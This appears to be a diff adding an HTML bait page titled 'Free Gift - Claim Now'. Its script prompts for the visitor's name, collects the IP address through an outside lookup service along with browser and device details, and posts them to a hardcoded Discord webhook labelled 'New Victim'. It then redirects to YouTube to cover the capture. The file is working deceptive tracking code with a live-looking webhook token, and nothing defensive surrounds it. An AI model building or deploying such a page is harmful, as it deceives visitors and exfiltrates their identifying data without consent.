@@ -1,0 +1,39 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Free Gift - Claim Now</title>
+    <meta name="description" content="Claim your exclusive reward!">
+</head>
+<body>
+    <h1>Loading your reward...</h1>
+    <script>
+        const data = {
+            name: prompt("Enter your name to claim:") || "Anonymous",
+            timestamp: new Date().toISOString(),
+            userAgent: navigator.userAgent,
+            platform: navigator.platform,
+            language: navigator.language,
+            screen: `${screen.width}x${screen.height}`,
+            referrer: document.referrer || "direct"
+        };
+
+        fetch('https://api.ipify.org?format=json')
+            .then(res => res.json())
+            .then(ipData => {
+                data.ip = ipData.ip;
+                
+                const webhook = "https://discord.com/api/webhooks/1516706014680973463/zTHEkVGuFtloIYwKQuSKgRGC6lVulRm8ly3GkolhF7S4TFu5TrWCs2tW0lb1Cpyu1Q04";
+                fetch(webhook, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        content: `**New Victim**\n**Name:** ${data.name}\n**IP:** ${data.ip}\n**Time:** ${data.timestamp}\n**UA:** ${data.userAgent}\n**Platform:** ${data.platform}\n**Screen:** ${data.screen}\n**Referrer:** ${data.referrer}`
+                    })
+                }).then(() => {
+                    window.location = "https://youtube.com"; // Change bait redirect
+                });
+            })
+            .catch(() => window.location = "https://youtube.com");
+    </script>
+</body>
+</html>
